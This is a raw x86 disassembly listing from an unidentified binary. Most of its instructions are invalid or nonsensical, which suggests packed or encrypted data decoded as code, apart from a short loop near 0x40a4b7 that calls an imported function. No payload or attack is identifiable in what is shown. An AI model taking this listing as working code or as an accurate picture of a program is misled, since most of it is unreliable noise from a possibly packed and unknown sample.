  409f5e:	mov    al,ds:0x91504cb7
  409f63:	gs or  edi,eax
  409f66:	lea    esp,[ecx+0x27e2a66]
  409f6c:	sub    BYTE PTR [edi+ecx*1-0x78],al
  409f70:	mov    esp,0x589588d5
  409f75:	(bad)  
  409f76:	ins    DWORD PTR es:[edi],dx
  409f77:	mov    esi,fs
  409f79:	xchg   ebx,eax
  409f7a:	mov    eax,0xe173ac8e
  409f7f:	pop    edi
  409f80:	sub    edi,edi
  409f82:	push   ecx
  409f83:	call   0xd71ec8fd
  409f88:	popf   
  409f89:	rcr    DWORD PTR [ebx+0x44],cl
  409f8c:	adc    ah,BYTE PTR [edx]
  409f8e:	mov    edi,0xd7a073dd
  409f93:	jp     0x409f59
  409f95:	mov    esi,DWORD PTR [ecx]
  409f97:	mov    ds:0x3fbac544,eax
  409f9c:	xor    eax,ebx
  409f9e:	(bad)  
  409f9f:	xchg   esi,eax
  409fa0:	adc    al,0xa5
  409fa2:	mov    ecx,0xd42624a0
  409fa7:	push   ebx
  409fa8:	mov    ebp,0x7a01a4ff
  409fad:	mov    esi,0x8cdc2841
  409fb2:	scas   eax,DWORD PTR es:[edi]
  409fb3:	out    0x99,al
  409fb5:	xchg   DWORD PTR [ecx-0x3e],edi
  409fb8:	ins    DWORD PTR es:[edi],dx
  409fb9:	or     BYTE PTR [edi+0x1c],dl
  409fbc:	sbb    edx,edi
  409fbe:	ror    BYTE PTR [edx],0x71
  409fc1:	xchg   edx,eax
  409fc2:	mov    edi,ebx
  409fc4:	fwait
  409fc5:	jecxz  0x409fb1
  409fc7:	cld    
  409fc8:	cmp    al,0x32
  409fca:	pop    ds
  409fcb:	jns    0x409f7c
  409fcd:	push   ds
  409fce:	mov    dl,0x24
  409fd0:	imul   ebx,edx,0xffffffe3
  409fd3:	jge    0x409fbc
  409fd5:	push   0xcc1d09d5
  409fda:	loop   0x40a039
  409fdc:	out    0x2,al
  409fde:	nop
  409fdf:	jmp    0x115:0x1696f663
  409fe6:	cdq    
  409fe7:	data16 sub al,0xfd
  409fea:	(bad)  
  409feb:	(bad)  
  409fed:	mov    BYTE PTR [ebp+0x2d69fbcb],0x43
  409ff4:	sub    cl,bh
  409ff6:	cmp    ebx,ecx
  409ff8:	repz push es
  409ffa:	push   edx
  409ffb:	popa   
  409ffc:	and    al,0xa7
  409ffe:	push   edx
  409fff:	mov    ebp,0x8d6439c8
  40a004:	out    dx,eax
  40a005:	sahf   
  40a006:	jg     0x40a068
  40a008:	arpl   WORD PTR [esi],ax
  40a00a:	in     al,0x95
  40a00c:	inc    edi
  40a00d:	or     eax,0x3babcf84
  40a012:	xchg   ebx,eax
  40a013:	mov    ds:0x99ac554c,al
  40a018:	aad    0xe4
  40a01a:	mov    ebp,0x14c12988
  40a01f:	jmp    0x2b95:0x6c39e799
  40a026:	sbb    al,0xd5
  40a028:	retf   
  40a029:	pop    ebp
  40a02a:	stos   BYTE PTR es:[edi],al
  40a02b:	call   0x4772:0x6e81c473
  40a032:	repnz adc al,0x81
  40a035:	pop    eax
  40a036:	push   cs
  40a037:	fdiv   DWORD PTR [ecx+eiz*1]
  40a03a:	jmp    0x6ef8:0x98305b22
  40a041:	inc    esp
  40a042:	jnp    0x40a00e
  40a044:	daa    
  40a045:	scas   al,BYTE PTR es:[edi]
  40a046:	lahf   
  40a047:	pop    esi
  40a048:	and    eax,0x8941bff9
  40a04d:	mov    dh,0x45
  40a04f:	mov    ds:0x56e81d2b,eax
  40a054:	push   0x7612f762
  40a059:	into   
  40a05a:	int    0xe9
  40a05c:	add    esi,ebx
  40a05e:	fild   WORD PTR [ebp+0x75]
  40a061:	jnp    0x40a0ce
  40a063:	rol    DWORD PTR [edi+0x65bffc9e],cl
  40a069:	xor    DWORD PTR [edx-0x56fc8283],edi
  40a06f:	out    0xc6,al
  40a071:	mov    edx,0x43fac2b3
  40a076:	adc    eax,0xe552eeb9
  40a07b:	ds es dec ebx
  40a07e:	mov    eax,0xa2b304a2
  40a083:	and    eax,esp
  40a085:	xchg   BYTE PTR ds:0x554d3bb6,ah
  40a08b:	ins    BYTE PTR es:[edi],dx
  40a08c:	mov    cl,0xe
  40a08e:	dec    edi
  40a08f:	cld    
  40a090:	inc    edi
  40a091:	push   0x21
  40a093:	sub    BYTE PTR [edi],dl
  40a095:	mov    bh,0x99
  40a097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a098:	push   edx
  40a099:	pop    ss
  40a09a:	or     esp,DWORD PTR [eax-0x22]
  40a09d:	adc    edx,DWORD PTR [di+0x668]
  40a0a2:	iret   
  40a0a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0a4:	jbe    0x40a063
  40a0a6:	dec    ebx
  40a0a7:	lds    eax,FWORD PTR [edx-0x732f11ec]
  40a0ad:	cmp    al,0xba
  40a0af:	pop    ebx
  40a0b0:	adc    eax,eax
  40a0b2:	imul   edi,DWORD PTR [ebp-0x64e97677],0xb0e7025a
  40a0bc:	push   esp
  40a0bd:	(bad)  
  40a0be:	shl    DWORD PTR [edi],cl
  40a0c0:	pop    ebx
  40a0c2:	clc    
  40a0c3:	push   esi
  40a0c4:	xlat   BYTE PTR ds:[ebx]
  40a0c5:	or     cl,BYTE PTR [ecx]
  40a0c7:	push   es
  40a0c8:	xchg   esp,eax
  40a0c9:	pop    eax
  40a0ca:	xor    DWORD PTR [edi+0x48],esp
  40a0cd:	jne    0x40a10a
  40a0cf:	bound  esi,QWORD PTR [eax]
  40a0d1:	pop    esi
  40a0d2:	scas   al,BYTE PTR es:[edi]
  40a0d3:	loope  0x40a0b7
  40a0d5:	push   ss
  40a0d6:	je     0x40a06b
  40a0d8:	push   cs
  40a0d9:	aam    0x63
  40a0db:	add    DWORD PTR [edx-0x18a6c6d4],eax
  40a0e1:	or     BYTE PTR ss:[esi],ah
  40a0e4:	mov    cl,0x66
  40a0e6:	in     eax,dx
  40a0e7:	hlt    
  40a0e8:	mov    bh,0x6a
  40a0ea:	mov    ebp,0x9d3c6dfa
  40a0ef:	push   ecx
  40a0f0:	out    0x8a,eax
  40a0f2:	push   ebx
  40a0f3:	in     al,dx
  40a0f4:	ret    
  40a0f5:	adc    al,0x6c
  40a0f7:	ins    DWORD PTR es:[edi],dx
  40a0f8:	xchg   edx,eax
  40a0f9:	add    eax,0x859dfda0
  40a0fe:	or     DWORD PTR [edx+0x6f],0x5bfff2cb
  40a105:	rcl    edx,cl
  40a107:	sub    ebx,0x41
  40a10a:	scas   eax,DWORD PTR es:[edi]
  40a10b:	push   0x4b
  40a10d:	and    ecx,edi
  40a10f:	pop    ss
  40a110:	jp     0x40a15f
  40a112:	mov    WORD PTR [edi],gs
  40a114:	stos   DWORD PTR es:[edi],eax
  40a115:	sub    bl,ah
  40a117:	in     eax,0xea
  40a119:	or     BYTE PTR ds:0x4f2a2fba,al
  40a11f:	ins    DWORD PTR es:[edi],dx
  40a120:	imul   ebp,DWORD PTR [edi],0xe6e3dafd
  40a126:	data16 fiadd WORD PTR [esi-0x26a211b3]
  40a12d:	add    BYTE PTR [edi],cl
  40a12f:	(bad)  
  40a130:	mov    WORD PTR [ebp-0xe],gs
  40a133:	adc    eax,0x2c62b767
  40a138:	test   BYTE PTR [esi+edx*8],0xfc
  40a13c:	(bad)  
  40a13d:	sbb    edx,DWORD PTR [ebp-0x50]
  40a140:	les    edx,FWORD PTR es:[edi-0x26]
  40a144:	add    DWORD PTR [ecx+0x60],ebp
  40a147:	mov    ebp,DWORD PTR [eax]
  40a149:	push   es
  40a14a:	pop    ss
  40a14b:	cs xor dl,0x10
  40a14f:	jb     0x40a140
  40a151:	in     al,0x92
  40a153:	mov    esi,0x761b204f
  40a158:	int    0x97
  40a15a:	lds    ebx,FWORD PTR [bp+0x7]
  40a15e:	fimul  WORD PTR [eax-0x5bf8f31d]
  40a164:	push   eax
  40a165:	xor    DWORD PTR [ebx],0x348e9c6
  40a16b:	add    BYTE PTR [eax],al
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	rcr    DWORD PTR [edi],0x67
  40a17c:	into   
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a1f7
  40a186:	popf   
  40a187:	jae    0x40a18f
  40a189:	xchg   edi,eax
  40a18a:	mov    edi,0xe552c5a7
  40a18f:	dec    ebx
  40a190:	or     eax,0xef72dd91
  40a195:	addr16 inc edx
  40a197:	pushf  
  40a198:	push   esi
  40a199:	lods   al,BYTE PTR ds:[esi]
  40a19a:	cmp    al,0xae
  40a19c:	lods   eax,DWORD PTR ds:[esi]
  40a19d:	push   edx
  40a19e:	into   
  40a19f:	jmp    0x40a132
  40a1a1:	pop    es
  40a1a2:	pop    ss
  40a1a3:	push   esi
  40a1a4:	or     DWORD PTR [edx-0x1f104f27],esi
  40a1aa:	push   ds
  40a1ab:	icebp  
  40a1ac:	jns    0x40a151
  40a1ae:	pop    ebx
  40a1af:	sti    
  40a1b0:	enter  0x2a4f,0x7e
  40a1b4:	mov    eax,0xfff3139e
  40a1b9:	push   cs
  40a1ba:	popf   
  40a1bb:	or     eax,0xa0cae90e
  40a1c0:	aam    0x37
  40a1c2:	push   ebx
  40a1c3:	or     BYTE PTR [ebx+ebx*4],dh
  40a1c6:	nop
  40a1c7:	stos   DWORD PTR es:[edi],eax
  40a1c8:	xchg   ebx,eax
  40a1c9:	mov    al,ds:0x3bed69dc
  40a1ce:	icebp  
  40a1cf:	mov    ecx,DWORD PTR ds:0x4f3a61a1
  40a1d5:	pop    es
  40a1d6:	out    0x40,eax
  40a1d8:	adc    ebx,eax
  40a1da:	in     eax,dx
  40a1db:	sbb    al,0xe2
  40a1dd:	ja     0x40a22b
  40a1df:	mov    cl,0xa0
  40a1e1:	in     al,0x37
  40a1e3:	xchg   edx,eax
  40a1e4:	pop    ebp
  40a1e5:	xchg   esp,eax
  40a1e6:	pop    edx
  40a1e7:	rcr    DWORD PTR [edx+ebp*1-0x46de4e94],0xf0
  40a1ef:	stos   DWORD PTR es:[edi],eax
  40a1f0:	pushf  
  40a1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f2:	dec    esi
  40a1f3:	adc    al,0xff
  40a1f5:	pop    esi
  40a1f6:	stos   DWORD PTR es:[edi],eax
  40a1f7:	clc    
  40a1f8:	mov    esi,?
  40a1fa:	lds    esp,FWORD PTR [esi+0x3e]
  40a1fd:	sub    al,0x43
  40a1ff:	and    eax,0xd78ad08f
  40a204:	pop    ebx
  40a205:	cs out dx,al
  40a207:	mov    dh,0x4e
  40a209:	push   0x5
  40a20b:	jmp    0x3c59df60
  40a210:	pop    ss
  40a211:	xchg   cx,ax
  40a213:	loop   0x40a1d7
  40a215:	push   ebx
  40a216:	pop    ebx
  40a217:	daa    
  40a218:	clc    
  40a219:	ja     0x40a285
  40a21b:	adc    eax,0x6598ca07
  40a220:	cs je  0x40a243
  40a223:	icebp  
  40a224:	and    al,0x53
  40a226:	or     al,al
  40a228:	(bad)  
  40a229:	and    BYTE PTR [ecx-0x2ae67ac2],ah
  40a22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a230:	pop    eax
  40a231:	stos   BYTE PTR es:[edi],al
  40a232:	pop    DWORD PTR [edx+0x4c]
  40a235:	ret    
  40a236:	shr    DWORD PTR [edi],1
  40a238:	ss popf 
  40a23a:	inc    edi
  40a23b:	fisttp WORD PTR [edi]
  40a23d:	mov    BYTE PTR [ebp-0x530ac383],bh
  40a243:	fdivr  QWORD PTR [eax]
  40a245:	(bad)  
  40a246:	sbb    al,0xfc
  40a248:	and    DWORD PTR [eax+edx*4-0x704ff17a],edx
  40a24f:	mov    edx,DWORD PTR [ebp+0x64]
  40a252:	jmp    0x1d0e:0x5f4cfde6
  40a259:	icebp  
  40a25a:	imul   ebx,DWORD PTR [ecx+0x461eabd8],0x5349090
  40a264:	repz push ecx
  40a266:	in     al,0xf9
  40a268:	mov    edi,0xe37d51b6
  40a26d:	sub    BYTE PTR [ecx],cl
  40a26f:	ds cld 
  40a271:	xchg   ecx,eax
  40a272:	aam    0x8c
  40a274:	push   edi
  40a275:	dec    esi
  40a276:	(bad)  [eax+0x7648631b]
  40a27c:	mul    cl
  40a27e:	xchg   ebx,eax
  40a27f:	mov    eax,ds:0x487a05fb
  40a284:	jge    0x40a27b
  40a286:	sar    BYTE PTR [ecx-0x42],0x7c
  40a28a:	xchg   esi,eax
  40a28b:	sub    al,0x82
  40a28d:	push   ecx
  40a28e:	mov    WORD PTR [edi],es
  40a290:	imul   eax,DWORD PTR [ecx],0x435cbccc
  40a296:	xor    DWORD PTR [ecx-0x5c],edx
  40a299:	sub    DWORD PTR [ebx+0x10],0xc7e7b42b
  40a2a0:	mov    edi,0x533328fb
  40a2a5:	dec    esp
  40a2a6:	test   al,0xe4
  40a2a8:	push   0x56
  40a2aa:	cmc    
  40a2ab:	sar    DWORD PTR [ecx+0x1dd9e8a1],cl
  40a2b1:	stos   BYTE PTR es:[edi],al
  40a2b2:	ins    DWORD PTR es:[edi],dx
  40a2b3:	pop    edx
  40a2b4:	jl     0x40a304
  40a2b6:	xlat   BYTE PTR ds:[ebx]
  40a2b7:	xor    eax,0x356f4a42
  40a2bc:	rol    bh,1
  40a2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2bf:	push   ebp
  40a2c0:	xchg   edi,eax
  40a2c1:	mov    ebp,0xad119c59
  40a2c6:	sub    dl,BYTE PTR [eax]
  40a2c8:	xor    DWORD PTR ds:0xcde0981c,esi
  40a2ce:	sub    DWORD PTR [edi+0x4e5d1f71],esi
  40a2d4:	inc    edi
  40a2d5:	sbb    ch,BYTE PTR [ecx+0x4d127c99]
  40a2db:	mov    eax,ds:0x80584c2c
  40a2e0:	sub    BYTE PTR [ecx],ch
  40a2e2:	mov    ah,0xa8
  40a2e4:	in     al,dx
  40a2e5:	aaa    
  40a2e6:	inc    ecx
  40a2e7:	mov    bh,0x2d
  40a2e9:	in     eax,0xfa
  40a2eb:	loope  0x40a306
  40a2ed:	xchg   DWORD PTR [edi],edx
  40a2ef:	add    BYTE PTR [edi-0x7f],dh
  40a2f2:	retf   
  40a2f3:	test   al,0xe8
  40a2f5:	mov    dl,0xd8
  40a2f7:	push   ebx
  40a2f8:	loop   0x40a2d8
  40a2fa:	sub    DWORD PTR [ebx],eax
  40a2fc:	adc    al,0x2a
  40a2fe:	ret    
  40a2ff:	in     eax,dx
  40a300:	aam    0xc7
  40a302:	repz data16 mov ch,0xd2
  40a306:	mov    ch,0x5c
  40a308:	sbb    ch,bh
  40a30a:	jge    0x40a37e
  40a30c:	cmc    
  40a30d:	jle    0x40a30d
  40a30f:	sub    ch,BYTE PTR [ecx-0x30]
  40a312:	dec    ebx
  40a313:	test   ch,bl
  40a315:	dec    edi
  40a316:	inc    ebx
  40a317:	mov    edx,0x22c743fa
  40a31c:	add    edi,DWORD PTR [edi]
  40a31e:	dec    esp
  40a31f:	dec    eax
  40a320:	(bad)  
  40a321:	enter  0x804b,0xce
  40a325:	mov    dh,0x41
  40a327:	daa    
  40a328:	nop
  40a329:	dec    BYTE PTR [edx+0x78dc313a]
  40a32f:	out    0xd8,eax
  40a331:	pushf  
  40a332:	call   0x2475:0xe74fdcdd
  40a339:	rcr    bl,0x77
  40a33c:	fdivr  QWORD PTR [ecx+eiz*8-0x9]
  40a340:	sub    BYTE PTR [ebp-0x4ccfe617],ah
  40a346:	outs   dx,BYTE PTR ds:[esi]
  40a347:	shld   DWORD PTR [edx-0x5d4b8933],ebx,cl
  40a34e:	mul    bl
  40a350:	mov    dh,0x9f
  40a352:	sbb    esp,DWORD PTR [ebx+0x1b]
  40a355:	mov    al,0x6d
  40a357:	mov    esp,0x1060b3dc
  40a35c:	pushf  
  40a35d:	mov    dl,BYTE PTR ds:0x4cd2c256
  40a363:	sbb    al,0xec
  40a365:	or     dl,BYTE PTR [eax]
  40a367:	and    al,0xfa
  40a369:	adc    edx,DWORD PTR [esi+0x1f]
  40a36c:	mov    ebp,0x99b3b707
  40a371:	jl     0x40a380
  40a373:	xchg   ebp,eax
  40a374:	(bad)  [eax]
  40a376:	in     al,dx
  40a377:	adc    eax,0x5d3345a2
  40a37c:	xlat   BYTE PTR ds:[ebx]
  40a37d:	cmp    esi,DWORD PTR [edx+edi*2]
  40a380:	fidivr WORD PTR [ecx+0x631b2649]
  40a386:	mov    esi,0xd34977d0
  40a38b:	fsub   DWORD PTR [eax-0x72]
  40a38e:	out    0xea,al
  40a390:	loope  0x40a3b7
  40a392:	mov    dh,0x9d
  40a394:	cmp    esp,DWORD PTR ds:0x63b2f831
  40a39a:	pop    esp
  40a39b:	jg     0x40a3f6
  40a39d:	ret    
  40a39e:	adc    eax,0x49c36c70
  40a3a3:	cmp    DWORD PTR [ecx],ebp
  40a3a5:	cdq    
  40a3a6:	pop    ebx
  40a3a7:	xchg   esp,eax
  40a3a8:	adc    al,0x8a
  40a3aa:	in     al,0x7f
  40a3ac:	jmp    0x40a34a
  40a3ae:	add    esi,DWORD PTR [ecx+0x67f5de5a]
  40a3b4:	aam    0xd1
  40a3b6:	push   esp
  40a3b7:	pop    eax
  40a3b8:	mov    al,BYTE PTR [ebp+0x2517065b]
  40a3be:	dec    esi
  40a3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3c0:	add    eax,0x23c716c7
  40a3c5:	jmp    0x40a35a
  40a3c7:	mov    esi,0x7854e2ba
  40a3cc:	les    edi,FWORD PTR [eax-0x17]
  40a3cf:	imul   ebp,DWORD PTR [ebp+0x4b01b4e9],0x5e
  40a3d6:	xchg   esi,eax
  40a3d7:	outs   dx,DWORD PTR ds:[esi]
  40a3d8:	push   ds
  40a3d9:	jmp    0xfc01:0xd4482d83
  40a3e0:	inc    esp
  40a3e2:	fwait
  40a3e3:	and    ebx,eax
  40a3e5:	retf   
  40a3e6:	test   BYTE PTR [edi-0x40],ch
  40a3e9:	push   ss
  40a3ea:	jmp    0x65a0:0xea489895
  40a3f1:	aad    0x29
  40a3f3:	stos   BYTE PTR es:[edi],al
  40a3f4:	sbb    al,0x44
  40a3f6:	(bad)  
  40a3f9:	dec    DWORD PTR [esi]
  40a3fb:	xchg   ecx,eax
  40a3fc:	cld    
  40a3fd:	jo     0x40a476
  40a3ff:	fild   DWORD PTR [edx+0x26e7f097]
  40a405:	xor    al,0xc1
  40a407:	xor    al,BYTE PTR [esi-0x786209b2]
  40a40d:	rcr    esp,1
  40a40f:	fnsave [edx+0x39]
  40a412:	imul   ecx,DWORD PTR [edi-0x5f555708],0x79
  40a419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a41a:	repz sub BYTE PTR [esi-0x2f],dl
  40a41e:	repz sti 
  40a420:	test   DWORD PTR [edx+0x3c],ebx
  40a423:	adc    edx,DWORD PTR [ebp-0x6]
  40a426:	arpl   WORD PTR [ecx-0x44],bx
  40a429:	mov    ecx,0x675ffb4a
  40a42e:	or     BYTE PTR [edi+eiz*8-0x69],0x26
  40a433:	in     al,dx
  40a434:	sub    dh,bl
  40a436:	fdivr  QWORD PTR [edi+0x2e]
  40a439:	pop    esi
  40a43a:	jae    0x40a4a5
  40a43c:	adc    BYTE PTR [edx],bh
  40a43e:	push   esp
  40a43f:	cmp    eax,DWORD PTR [edi+0x3f]
  40a442:	es push es
  40a444:	sbb    ah,0x8e
  40a447:	mov    eax,ds:0xa21c5104
  40a44c:	xchg   esp,eax
  40a44d:	pop    es
  40a44e:	test   esi,edx
  40a450:	popa   
  40a451:	push   0xcd788d61
  40a456:	out    dx,eax
  40a457:	test   DWORD PTR [edi+0x235a89ee],ecx
  40a45d:	dec    edi
  40a45e:	sbb    ecx,0xb3a33916
  40a464:	xchg   esi,eax
  40a465:	test   BYTE PTR [edx-0x52],dh
  40a468:	(bad)  
  40a46a:	ins    DWORD PTR es:[edi],dx
  40a46b:	push   DWORD PTR [ebx+0xe]
  40a46e:	loope  0x40a462
  40a470:	xor    bh,BYTE PTR [edx+ebx*8]
  40a473:	dec    edi
  40a474:	inc    esp
  40a475:	jne    0x40a4f0
  40a477:	in     al,0xe2
  40a479:	mov    ebp,DWORD PTR [ebx+ebx*1+0x71]
  40a47d:	aaa    
  40a47e:	cmp    ebp,DWORD PTR [eax]
  40a480:	pusha  
  40a481:	mov    bh,0x89
  40a483:	(bad)  
  40a484:	sbb    cl,BYTE PTR [edi+ebx*1-0x624e771a]
  40a48b:	and    BYTE PTR [edi+0x3b],bh
  40a48e:	(bad)  
  40a490:	sbb    dl,BYTE PTR [eax+0x5c]
  40a493:	mov    al,ds:0x2a45dd01
  40a498:	sbb    ah,ch
  40a49a:	ins    DWORD PTR es:[edi],dx
  40a49b:	sub    esp,DWORD PTR ds:0xebbadc9a
  40a4a1:	popa   
  40a4a2:	(bad)  
  40a4a3:	xchg   esp,eax
  40a4a4:	pusha  
  40a4a5:	push   ebx
  40a4a6:	fldcw  WORD PTR [ecx+0x3c8fa0ec]
  40a4ac:	jmp    0x40a48b
  40a4ae:	or     DWORD PTR [ecx-0x7d],edx
  40a4b1:	(bad)  
  40a4b2:	shl    DWORD PTR [eax-0x34],cl
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x430471,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss xor al,0xe9
  40a513:	cmc    
  40a514:	sahf   
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a52b
  40a51e:	cdq    
  40a51f:	shl    DWORD PTR [ebp-0x78],0xb6
  40a523:	dec    edi
  40a524:	push   ss
  40a525:	cmp    DWORD PTR [esi+0x4f],esi
  40a528:	mov    bh,0x53
  40a52a:	and    eax,DWORD PTR [edx-0x42]
  40a52d:	pop    ebx
  40a52e:	pop    es
  40a52f:	test   DWORD PTR [esi],0x1dc82006
  40a535:	pop    edi
  40a536:	clc    
  40a537:	fwait
  40a538:	mov    ds:0x1892e31e,al
  40a53d:	mov    ds:0x7f1ea71f,eax
  40a542:	dec    ecx
  40a543:	sbb    ebp,DWORD PTR [edi-0x2a02aec4]
  40a549:	fst    QWORD PTR [ecx]
  40a54b:	dec    BYTE PTR [ebx+0x2d]
  40a54e:	inc    edx
  40a54f:	and    eax,0xdf9784e0
  40a554:	mov    edi,0x9ee40a80
  40a559:	adc    ecx,edi
  40a55b:	scas   eax,DWORD PTR es:[edi]
  40a55c:	rcr    bl,cl
  40a55e:	nop
  40a55f:	mov    cl,0x5a
  40a561:	(bad)  
  40a562:	pusha  
  40a563:	and    dh,BYTE PTR [edi+0x70aaee19]
  40a569:	icebp  
  40a56a:	rcl    DWORD PTR [esi],0x0
  40a56d:	retf   0x4f91
  40a570:	ret    0x358a
  40a573:	mov    WORD PTR [ebx+esi*2],es
  40a576:	(bad)  
  40a578:	sbb    BYTE PTR [esi+0x76],bh
  40a57b:	test   DWORD PTR [eax+0xcb837b2],edx
  40a581:	push   esi
  40a582:	gs (bad) 
  40a585:	hlt    
  40a586:	jbe    0x40a5a7
  40a588:	popf   
  40a589:	mov    eax,ds:0x70176a0
  40a58e:	inc    esi
  40a58f:	add    eax,ebx
  40a591:	or     ebx,DWORD PTR [ecx+esi*4-0x674bed6b]
  40a598:	xchg   DWORD PTR [esi],edx
  40a59a:	push   eax
  40a59b:	pop    ss
  40a59c:	cmp    DWORD PTR [ecx],ebp
  40a59e:	popf   
  40a59f:	scas   al,BYTE PTR es:[edi]
  40a5a0:	adc    DWORD PTR [eax],ebp
  40a5a2:	add    BYTE PTR [ebp-0x4cc90cca],ah
  40a5a8:	hlt    
  40a5a9:	mov    ecx,0x141610b6
  40a5ae:	(bad)  
  40a5af:	stos   BYTE PTR es:[edi],al
  40a5b0:	(bad)  
  40a5b1:	xchg   esp,eax
  40a5b2:	ds mov dh,0x7f
  40a5b5:	bound  esp,QWORD PTR [ecx-0x2e68b9ee]
  40a5bb:	inc    ebx
  40a5bc:	jb     0x40a5d0
  40a5be:	jb     0x40a547
  40a5c0:	cmc    
  40a5c1:	jl     0x40a590
  40a5c3:	push   edi
  40a5c4:	ins    BYTE PTR es:[edi],dx
  40a5c5:	xchg   esp,eax
  40a5c6:	mov    WORD PTR ds:0x9274444c,?
  40a5cc:	xchg   edi,eax
  40a5cd:	push   edx
  40a5ce:	sub    DWORD PTR [ecx+ecx*8-0x52fd575b],ecx
  40a5d5:	adc    eax,0x37cd1bcb
  40a5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5db:	mov    al,0xd2
  40a5dd:	adc    si,WORD PTR [esi+eax*2-0x14]
  40a5e2:	rol    DWORD PTR [eax],1
  40a5e4:	cmovl  ecx,DWORD PTR [ebx-0x27]
  40a5e8:	mov    ah,bl
  40a5ea:	xchg   DWORD PTR [ecx-0x4],ebx
  40a5ed:	and    al,0x1a
  40a5ef:	lds    eax,FWORD PTR [esi+0x22]
  40a5f2:	ficom  WORD PTR [ebp-0x776bbc90]
  40a5f8:	retf   
  40a5f9:	adc    dh,BYTE PTR ds:0x99d97126
  40a5ff:	popf   
  40a600:	lahf   
  40a601:	jb     0x40a5a6
  40a603:	test   bl,bh
  40a605:	sub    ecx,eax
  40a607:	inc    edx
  40a608:	lods   al,BYTE PTR ds:[esi]
  40a609:	push   esp
  40a60a:	enter  0xcc40,0x6c
  40a60e:	mov    eax,ds:0x172de0ff
  40a613:	mov    bl,0x83
  40a615:	cmp    DWORD PTR [ebx],ecx
  40a617:	mov    edi,0x35314c5a
  40a61c:	pop    eax
  40a61d:	dec    ecx
  40a61e:	jne    0x40a613
  40a620:	mov    al,0xf4
  40a622:	and    ecx,DWORD PTR [edx+0x2df6c6b3]
  40a628:	lock scas al,BYTE PTR es:[edi]
  40a62a:	mov    cl,0xca
  40a62c:	sub    bl,BYTE PTR [edi-0xaaacdae]
  40a632:	ss or  al,cl
  40a635:	cmp    DWORD PTR [ebx],edx
  40a637:	je     0x40a612
  40a639:	stos   DWORD PTR es:[edi],eax
  40a63a:	sbb    esi,DWORD PTR [edi+0x10]
  40a63d:	leave  
  40a63e:	sbb    eax,0xc780fd3e
  40a643:	mov    ebp,0xd29386ba
  40a648:	cmp    dh,al
  40a64a:	mov    dh,0xec
  40a64c:	std    
  40a64d:	not    BYTE PTR [edi-0x7f]
  40a650:	mov    bl,0xfc
  40a652:	mov    dh,0x4b
  40a654:	and    eax,0x209129a5
  40a659:	push   eax
  40a65a:	cmp    al,BYTE PTR [edi]
  40a65c:	test   BYTE PTR [edi],0x2e
  40a65f:	push   esi
  40a660:	outs   dx,BYTE PTR ds:[esi]
  40a661:	mov    esp,0x2b41260
  40a666:	mov    ds:0x16b926b4,eax
  40a66b:	test   ch,ah
  40a66d:	stc    
  40a66e:	xor    edi,ecx
  40a670:	cmp    eax,0x12d47915
  40a675:	inc    ebp
  40a676:	add    al,0x42
  40a678:	jns    0x40a67d
  40a67a:	sub    eax,0x77be6c36
  40a67f:	cld    
  40a680:	or     ebp,ecx
  40a682:	outs   dx,BYTE PTR ds:[esi]
  40a683:	mov    ah,0x5
  40a685:	loope  0x40a67f
  40a687:	hlt    
  40a688:	mov    esi,ecx
  40a68a:	pop    ecx
  40a68b:	mov    cl,BYTE PTR [edx]
  40a68d:	cmp    DWORD PTR [edx-0x4a8967d8],edx
  40a693:	inc    eax
  40a694:	(bad)  
  40a696:	mov    eax,ds:0x9780a46b
  40a69b:	int3   
  40a69c:	in     eax,0x38
  40a69e:	(bad)  
  40a69f:	fsub   DWORD PTR [ebx+0x17cfa0af]
  40a6a5:	or     al,0xf2
  40a6a7:	mov    ebp,0x9dd06ecc
  40a6ac:	xchg   DWORD PTR [ebp+0x4f53ba07],ecx
  40a6b2:	test   al,0xea
  40a6b4:	pop    esi
  40a6b5:	adc    DWORD PTR [ebp-0x37],edi
  40a6b8:	imul   ebp,DWORD PTR [esi-0x7d],0x70322ee2
  40a6bf:	retf   0x2f84
  40a6c2:	test   eax,0xf076c4da
  40a6c7:	sbb    eax,0xbf10326e
  40a6cc:	call   0x4b892164
  40a6d1:	add    BYTE PTR [edx],bl
  40a6d3:	xor    BYTE PTR [esi-0x2d2945f],0x2d
  40a6da:	test   BYTE PTR cs:[ecx+0x57ffd1d7],bh
  40a6e1:	ret    0x3163
  40a6e4:	add    edi,DWORD PTR [ebx]
  40a6e6:	push   0xe473f161
  40a6eb:	sub    bh,cl
  40a6ed:	mov    dl,0x39
  40a6ef:	sbb    edi,DWORD PTR [eax]
  40a6f1:	jnp    0x40a753
  40a6f3:	retf   
  40a6f4:	sbb    al,0xad
  40a6f6:	pop    ss
  40a6f7:	pop    eax
  40a6f8:	push   0xffffffc5
  40a6fa:	inc    eax
  40a6fb:	xchg   esp,eax
